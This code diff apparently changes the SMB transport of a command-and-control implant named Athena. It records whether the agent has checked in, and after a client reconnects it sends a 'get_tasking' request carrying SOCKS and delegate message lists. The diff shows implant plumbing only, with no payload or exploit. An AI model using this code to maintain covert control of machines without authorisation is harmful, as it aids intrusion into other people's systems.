@@ -17,7 +17,7 @@ using System.Security.AccessControl;
 using System.Security.Principal;
 using System.Text;
 using System.Text.Json;
-
+using Athena.Models;
 
 namespace Athena
 {
@@ -41,7 +41,7 @@ namespace Athena
         public event EventHandler<TaskingReceivedArgs> SetTaskingReceived;
         private ManualResetEvent onCheckinResponse = new ManualResetEvent(false);
         private ConcurrentDictionary<string, StringBuilder> partialMessages = new ConcurrentDictionary<string, StringBuilder>();
-
+        private bool checkedin = false;
         public Smb()
         {
             DateTime kd = DateTime.TryParse("killdate", out kd) ? kd : DateTime.MaxValue;
@@ -159,7 +159,7 @@ namespace Athena
             {
                 string res = this.checkinResponse;
                 this.checkinResponse = String.Empty;
-
+                this.checkedin = true;
                 return JsonSerializer.Deserialize(res, CheckinResponseJsonContext.Default.CheckinResponse);
             }
 
@@ -222,6 +222,18 @@ namespace Athena
             Debug.WriteLine($"[{DateTime.Now}] New Client Connected!");
             onClientConnectedSignal.Set();
             this.connected = true;
+            if (this.checkedin)
+            {
+                GetTasking gt = new GetTasking()
+                {
+                    action = "get_tasking",
+                    tasking_size = -1,
+                    delegates = new List<DelegateMessage>(),
+                    socks = new List<SocksMessage>(),
+                    responses = new List<string>(),
+                };
+                await this.Send(JsonSerializer.Serialize(gt, GetTaskingJsonContext.Default.GetTasking));
+            }
         }
         private async Task OnClientDisconnect()
         {
